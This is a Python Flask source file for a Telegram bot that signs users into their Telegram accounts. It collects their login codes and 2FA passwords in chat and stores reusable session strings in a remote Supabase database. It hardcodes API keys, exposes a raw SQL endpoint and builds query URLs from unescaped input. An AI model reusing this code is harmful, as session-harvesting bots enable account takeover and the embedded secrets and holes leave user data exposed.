from flask import Flask, request, jsonify
import requests
import logging
import os
import importlib
import sys
from datetime import datetime
import uuid
import asyncio
import json
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
import nest_asyncio

# Apply nest_asyncio to allow nested event loops
nest_asyncio.apply()

# Add current directory to Python path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Supabase Configuration
SUPABASE_URL = 'https://megohojyelqspypejlpo.supabase.co'
SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1lZ29ob2p5ZWxxc3B5cGVqbHBvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTIzMjQxMDAsImV4cCI6MjA2NzkwMDEwMH0.d3qS8Z0ihWXubYp7kYLsGc0qEpDC1iOdxK9QdfozXWo'

# Telegram API Configuration
API_ID = os.environ.get('API_ID', '24022189')
API_HASH = os.environ.get('API_HASH', '915787c7b32a3bcefefff25065251251')

# Global storage
user_sessions = {}
command_handlers = {}
next_command_handlers = {}
login_sessions = {}

def generate_id(length=8):
    """Generate unique ID"""
    return str(uuid.uuid4())[:length]

class SupabaseClient:
    def __init__(self):
        self.base_url = SUPABASE_URL
        self.api_key = SUPABASE_KEY

    def execute_sql(self, sql):
        """Execute SQL via Supabase RPC"""
        try:
            response = requests.post(
                f"{self.base_url}/rest/v1/rpc/execute_sql",
                headers={
                    'apikey': self.api_key,
                    'Content-Type': 'application/json',
                    'Authorization': f'Bearer {self.api_key}'
                },
                json={'sql': sql},
                timeout=30
            )
            if not response.ok:
                logger.error(f"Supabase SQL Error: {response.status} {response.text}")
                return None
            return response.json()
        except Exception as e:
            logger.error(f"Supabase execute_sql error: {e}")
            return None

    def create_telegram_sessions_table(self):
        """Create tables for telegram sessions"""
        sql = """
        CREATE TABLE IF NOT EXISTS telegram_sessions (
            id TEXT PRIMARY KEY,
            user_id BIGINT NOT NULL,
            phone_number TEXT NOT NULL,
            session_string TEXT NOT NULL,
            is_active BOOLEAN DEFAULT TRUE,
            created_at TIMESTAMPTZ DEFAULT NOW(),
            last_used TIMESTAMPTZ DEFAULT NOW()
        );
        """
        return self.execute_sql(sql)

    def save_telegram_session(self, user_id, phone_number, session_string):
        """Save telegram session to database"""
        try:
            session_id = generate_id(8)
            response = requests.post(
                f"{self.base_url}/rest/v1/telegram_sessions",
                headers={
                    'apikey': self.api_key,
                    'Content-Type': 'application/json',
                    'Authorization': f'Bearer {self.api_key}',
                    'Prefer': 'return=representation'
                },
                json={
                    'id': session_id,
                    'user_id': user_id,
                    'phone_number': phone_number,
                    'session_string': session_string,
                    'last_used': datetime.now().isoformat()
                }
            )
            
            if not response.ok:
                logger.error(f"Save session error: {response.status} {response.text}")
                return None
                
            result = response.json()
            return result[0] if result else {'id': session_id}
            
        except Exception as e:
            logger.error(f"Error saving session: {e}")
            return None

    def get_user_sessions(self, user_id):
        """Get all sessions for a user"""
        try:
            response = requests.get(
                f"{self.base_url}/rest/v1/telegram_sessions?user_id=eq.{user_id}&is_active=eq.true",
                headers={
                    'apikey': self.api_key,
                    'Authorization': f'Bearer {self.api_key}'
                }
            )
            
            if not response.ok:
                return []
                
            return response.json()
            
        except Exception as e:
            logger.error(f"Error getting sessions: {e}")
            return []

    def get_session_by_phone(self, user_id, phone_number):
        """Get specific session by phone number"""
        try:
            response = requests.get(
                f"{self.base_url}/rest/v1/telegram_sessions?user_id=eq.{user_id}&phone_number=eq.{phone_number}&is_active=eq.true",
                headers={
                    'apikey': self.api_key,
                    'Authorization': f'Bearer {self.api_key}'
                }
            )
            
            if not response.ok:
                return None
                
            result = response.json()
            return result[0] if result else None
            
        except Exception as e:
            logger.error(f"Error getting session: {e}")
            return None

    def deactivate_session(self, session_id, user_id):
        """Deactivate a session"""
        try:
            response = requests.patch(
                f"{self.base_url}/rest/v1/telegram_sessions?id=eq.{session_id}&user_id=eq.{user_id}",
                headers={
                    'apikey': self.api_key,
                    'Content-Type': 'application/json',
                    'Authorization': f'Bearer {self.api_key}'
                },
                json={'is_active': False}
            )
            
            return response.ok
            
        except Exception as e:
            logger.error(f"Error deactivating session: {e}")
            return False

class TelegramAccountManager:
    def __init__(self):
        self.supabase = SupabaseClient()
    
    def get_event_loop(self):
        """Get or create event loop"""
        try:
            return asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop
    
    async def create_client(self, session_string=None):
        """Create Telegram client with or without session"""
        client = TelegramClient(
            StringSession(session_string) if session_string else StringSession(),
            int(API_ID),
            API_HASH
        )
        return client
    
    async def login_with_phone(self, phone_number, user_info, chat_id):
        """Start login process with phone number"""
        user_id = user_info.get('id')
        login_id = generate_id(6)
        
        try:
            client = await self.create_client()
            await client.connect()
            
            # Send code request with longer timeout
            code_request = await client.send_code_request(phone_number)
            phone_code_hash = code_request.phone_code_hash
            
            # Store login session
            login_sessions[login_id] = {
                'client': client,
                'phone_number': phone_number,
                'phone_code_hash': phone_code_hash,
                'user_info': user_info,
                'chat_id': chat_id,
                'created_at': datetime.now(),
                'attempts': 0
            }
            
            return f"""
📱 <b>Telegram Login Started</b>

✅ <b>Code sent to:</b> +{phone_number}

🔢 <b>Please enter the verification code:</b>
<code>/verify {login_id} 123456</code>

💡 <b>Format:</b> <code>/verify login_id code</code>

⚠️ <b>If you have 2FA password:</b>
After code, you'll be asked for password.

🆔 <b>Login ID:</b> <code>{login_id}</code>
"""
            
        except Exception as e:
            logger.error(f"Login error: {e}")
            return f"❌ <b>Login failed:</b> {str(e)}"
    
    async def verify_code(self, login_id, code, user_info, chat_id):
        """Verify login code"""
        if login_id not in login_sessions:
            return "❌ <b>Invalid or expired login session!</b> Please start login again with <code>/login</code>."
        
        session_data = login_sessions[login_id]
        client = session_data['client']
        session_data['attempts'] += 1
        
        try:
            # Complete sign in
            await client.sign_in(
                session_data['phone_number'],
                code,
                phone_code_hash=session_data['phone_code_hash']
            )
            
            # Get session string
            session_string = client.session.save()
            
            # Save to database
            self.supabase.save_telegram_session(
                user_info.get('id'),
                session_data['phone_number'],
                session_string
            )
            
            # Get account info
            me = await client.get_me()
            
            # Cleanup
            await client.disconnect()
            del login_sessions[login_id]
            
            return f"""
✅ <b>Login Successful!</b>

👤 <b>Account:</b> {me.first_name} {me.last_name or ''}
📱 <b>Phone:</b> +{session_data['phone_number']}
🆔 <b>Username:</b> @{me.username or 'N/A'}
🔐 <b>Session saved securely!</b>

📊 <b>Manage accounts:</b> <code>/accounts</code>
📤 <b>Send message:</b> <code>/send {session_data['phone_number']} | username | message</code>
"""
            
        except SessionPasswordNeededError:
            # Store for password
            login_sessions[login_id]['needs_password'] = True
            return """
🔐 <b>2FA Password Required</b>

This account has two-step verification.

🔢 <b>Please enter your password:</b>
<code>/password {login_id} your_password</code>

⚠️ <b>Note:</b> This will complete the login process properly.
"""
            
        except PhoneCodeInvalidError:
            remaining_attempts = 5 - session_data['attempts']
            if remaining_attempts > 0:
                return f"❌ <b>Invalid code!</b> {remaining_attempts} attempts remaining. Please check and try again."
            else:
                await client.disconnect()
                del login_sessions[login_id]
                return "❌ <b>Too many failed attempts!</b> Please start login again."
            
        except PhoneCodeExpiredError:
            await client.disconnect()
            del login_sessions[login_id]
            return "❌ <b>Code expired!</b> Please start login again with <code>/login</code>."
            
        except Exception as e:
            logger.error(f"Verify error: {e}")
            # Cleanup on error
            try:
                await client.disconnect()
            except:
                pass
            if login_id in login_sessions:
                del login_sessions[login_id]
            return f"❌ <b>Verification failed:</b> {str(e)}"
    
    async def verify_password(self, login_id, password, user_info, chat_id):
        """Verify 2FA password - COMPLETE LOGIN PROPERLY"""
        if login_id not in login_sessions:
            return "❌ <b>Invalid login session!</b> Please start login again."
        
        session_data = login_sessions[login_id]
        if not session_data.get('needs_password'):
            return "❌ <b>Password not required!</b>"
        
        client = session_data['client']
        
        try:
            # Complete sign in with password
            await client.sign_in(password=password)
            
            # Get session string
            session_string = client.session.save()
            
            # Save to database
            self.supabase.save_telegram_session(
                user_info.get('id'),
                session_data['phone_number'],
                session_string
            )
            
            # Get account info
            me = await client.get_me()
            
            # Cleanup
            await client.disconnect()
            del login_sessions[login_id]
            
            return f"""
✅ <b>Login Successful!</b>

🔐 <b>2FA verified successfully!</b>

👤 <b>Account:</b> {me.first_name} {me.last_name or ''}
📱 <b>Phone:</b> +{session_data['phone_number']}
🆔 <b>Username:</b> @{me.username or 'N/A'}

📊 <b>Manage accounts:</b> <code>/accounts</code>
📤 <b>Send message:</b> <code>/send {session_data['phone_number']} | username | message</code>
"""
            
        except Exception as e:
            logger.error(f"Password error: {e}")
            # Cleanup on error
            try:
                await client.disconnect()
            except:
                pass
            if login_id in login_sessions:
                del login_sessions[login_id]
            return f"❌ <b>Password verification failed:</b> {str(e)}"
    
    async def get_user_accounts(self, user_id):
        """Get all logged in accounts for user"""
        sessions = self.supabase.get_user_sessions(user_id)
        accounts = []
        
        for session in sessions:
            try:
                client = await self.create_client(session['session_string'])
                await client.connect()
                
                me = await client.get_me()
                accounts.append({
                    'phone': session['phone_number'],
                    'name': f"{me.first_name} {me.last_name or ''}",
                    'username': me.username,
                    'session_id': session['id'],
                    'is_active': True
                })
                
                await client.disconnect()
                
            except Exception as e:
                logger.error(f"Error loading session {session['phone_number']}: {e}")
                # Deactivate invalid session
                self.supabase.deactivate_session(session['id'], user_id)
        
        return accounts
    
    async def send_message_via_account(self, user_id, phone_number, target, message):
        """Send message using specific account"""
        session = self.supabase.get_session_by_phone(user_id, phone_number)
        if not session:
            return False, "❌ <b>Account not found!</b>"
        
        client = None
        try:
            client = await self.create_client(session['session_string'])
            await client.connect()
            
            # Send message
            result = await client.send_message(target, message)
            
            await client.disconnect()
            return True, f"""
✅ <b>Message Sent Successfully!</b>

📱 <b>From:</b> +{phone_number}
🎯 <b>To:</b> {target}
📝 <b>Message:</b> {message}
"""
            
        except Exception as e:
            logger.error(f"Send message error: {e}")
            if client:
                try:
                    await client.disconnect()
                except:
                    pass
            return False, f"❌ <b>Failed to send message:</b> {str(e)}"
    
    async def logout_completely(self, user_id, phone_number):
        """Complete logout from Telegram (terminate session everywhere)"""
        session = self.supabase.get_session_by_phone(user_id, phone_number)
        if not session:
            return False, "❌ <b>Account not found!</b>"
        
        client = None
        try:
            client = await self.create_client(session['session_string'])
            await client.connect()
            
            # Terminate all sessions except current one
            await client.log_out()
            
            # Deactivate from our database
            self.supabase.deactivate_session(session['id'], user_id)
            
            await client.disconnect()
            return True, f"""
✅ <b>Complete Logout Successful!</b>

📱 <b>Account:</b> +{phone_number}
🔐 <b>All sessions terminated</b>
🚫 <b>Logged out from all devices</b>

⚠️ <b>You'll need to login again to use this account.</b>
"""
            
        except Exception as e:
            logger.error(f"Logout error: {e}")
            if client:
                try:
                    await client.disconnect()
                except:
                    pass
            # Still deactivate from our database
            self.supabase.deactivate_session(session['id'], user_id)
            return False, f"❌ <b>Logout failed:</b> {str(e)}"

# Global instances
supabase = SupabaseClient()
telegram_manager = TelegramAccountManager()

# Helper functions for async operations
def run_async(coro):
    """Run async coroutine in event loop"""
    loop = telegram_manager.get_event_loop()
    return loop.run_until_complete(coro)

class Bot:
    @staticmethod
    def handleNextCommand(command_name, user_info, chat_id, prompt_message=None):
        """Set up next command handler"""
        user_id = user_info.get('id')
        
        if command_name.startswith('/'):
            command_name = command_name[1:]
            
        next_command_handlers[user_id] = {
            'command': command_name,
            'timestamp': datetime.now().isoformat(),
            'user_info': user_info,
            'chat_id': chat_id
        }
        
        if prompt_message:
            return prompt_message
        return f"🔄 Waiting for your input for command: {command_name}..."

def auto_discover_handlers():
    """Automatically discover all handler modules"""
    handlers = {}
    
    try:
        handlers_dir = 'handlers'
        current_dir = os.path.dirname(os.path.abspath(__file__))
        handlers_path = os.path.join(current_dir, handlers_dir)
        
        logger.info(f"🔍 Looking for handlers in: {handlers_path}")
        
        if os.path.exists(handlers_path):
            for filename in os.listdir(handlers_path):
                if filename.endswith('.py') and filename != '__init__.py':
                    command_name = filename[:-3]
                    
                    logger.info(f"📁 Found handler file: {filename} -> /{command_name}")
                    
                    try:
                        spec = importlib.util.spec_from_file_location(
                            command_name, 
                            os.path.join(handlers_path, filename)
                        )
                        module = importlib.util.module_from_spec(spec)
                        spec.loader.exec_module(module)
                        
                        if hasattr(module, 'handle'):
                            handlers[f"/{command_name}"] = module.handle
                            logger.info(f"✅ Auto-loaded command: /{command_name}")
                        else:
                            logger.warning(f"⚠️ 'handle' function not found in {filename}")
                        
                    except Exception as e:
                        logger.error(f"❌ Error loading handler {command_name}: {e}")
        else:
            logger.error(f"❌ Handlers directory not found: {handlers_path}")
    
    except Exception as e:
        logger.error(f"❌ Error discovering handlers: {e}")
    
    return handlers

def send_telegram_message(chat_id, text, parse_mode='HTML', reply_markup=None):
    """Send message with various options"""
    message_data = {
        'method': 'sendMessage',
        'chat_id': chat_id,
        'text': text,
        'parse_mode': parse_mode
    }
    
    if reply_markup:
        message_data['reply_markup'] = reply_markup
        
    return message_data

# Initialize command handlers on startup
command_handlers = auto_discover_handlers()
logger.info(f"🎯 Total commands loaded: {len(command_handlers)}")
logger.info(f"📋 Available commands: {list(command_handlers.keys())}")

# Setup tables on application startup
def setup_tables():
    """Setup database tables when app starts"""
    try:
        logger.info("🔄 Setting up telegram sessions tables...")
        result = supabase.create_telegram_sessions_table()
        if result:
            logger.info("✅ Telegram sessions tables setup completed")
        else:
            logger.warning("⚠️ Table setup may have failed - check Supabase connection")
    except Exception as e:
        logger.error(f"❌ Table setup error: {e}")

# Call table setup when module loads
setup_tables()

@app.route('/', methods=['GET', 'POST', 'HEAD'])
def handle_request():
    try:
        token = request.args.get('token') or os.environ.get('BOT_TOKEN')
        
        if request.method == 'HEAD':
            return '', 200
            
        if not token:
            return jsonify({
                'error': 'Token required',
                'solution': 'Add ?token=YOUR_BOT_TOKEN to URL or set BOT_TOKEN environment variable'
            }), 400

        if request.method == 'GET':
            return jsonify({
                'status': '✅ Telegram Account Manager is running',
                'available_commands': list(command_handlers.keys()),
                'total_commands': len(command_handlers),
                'active_login_sessions': len(login_sessions),
                'timestamp': datetime.now().isoformat()
            })

        if request.method == 'POST':
            update = request.get_json()
            
            if not update:
                return jsonify({'error': 'Invalid JSON data'}), 400
            
            if 'message' in update:
                chat_id = update['message']['chat']['id']
                message_text = update['message'].get('text', '').strip()
                user_info = update['message'].get('from', {})
                user_id = user_info.get('id')
                
                logger.info(f"📩 Message from {user_info.get('first_name')}: {message_text}")
                
                # Check for next command handler first
                if user_id in next_command_handlers:
                    next_command_data = next_command_handlers.pop(user_id)
                    command_name = next_command_data['command']
                    
                    if f"/{command_name}" in command_handlers:
                        response_text = command_handlers[f"/{command_name}"](
                            next_command_data['user_info'], 
                            next_command_data['chat_id'], 
                            message_text
                        )
                        return jsonify(send_telegram_message(chat_id, response_text))
                
                # Handle regular commands
                for command, handler in command_handlers.items():
                    if message_text.startswith(command):
                        try:
                            response_text = handler(user_info, chat_id, message_text)
                            return jsonify(send_telegram_message(chat_id, response_text))
                        except Exception as e:
                            error_msg = f"❌ Error executing command: {str(e)}"
                            logger.error(f"Command error: {e}")
                            return jsonify(send_telegram_message(chat_id, error_msg))
                
                # Default response for unknown commands
                available_commands = "\n".join([f"• <code>{cmd}</code>" for cmd in command_handlers.keys()])
                if available_commands:
                    response_text = f"""
❌ <b>Unknown Command:</b> <code>{message_text}</code>

📋 <b>Available Commands:</b>
{available_commands}

💡 <b>Help:</b> <code>/help</code>
"""
                else:
                    response_text = "❌ <b>No commands loaded!</b> Check server logs."
                    
                return jsonify(send_telegram_message(chat_id, response_text))
            
            return jsonify({'ok': True})

    except Exception as e:
        logger.error(f'❌ Error: {e}')
        return jsonify({'error': 'Processing failed'}), 500

@app.route('/health')
def health_check():
    return jsonify({
        'status': 'healthy', 
        'total_commands': len(command_handlers),
        'commands': list(command_handlers.keys()),
        'active_login_sessions': len(login_sessions),
        'timestamp': datetime.now().isoformat()
    }), 200

@app.route('/webhook', methods=['POST'])
def webhook():
    """Alternative webhook endpoint with better error handling"""
    return handle_request()

@app.route('/clear_pending', methods=['POST'])
def clear_pending():
    """Clear pending updates"""
    token = request.args.get('token') or os.environ.get('BOT_TOKEN')
    if not token:
        return jsonify({'error': 'Token required'}), 400
    
    # Clear pending updates
    response = requests.post(
        f'https://api.telegram.org/bot{token}/getUpdates',
        params={'offset': -1}
    )
    
    return jsonify({'status': 'Pending updates cleared'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🚀 Starting Telegram Account Manager on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)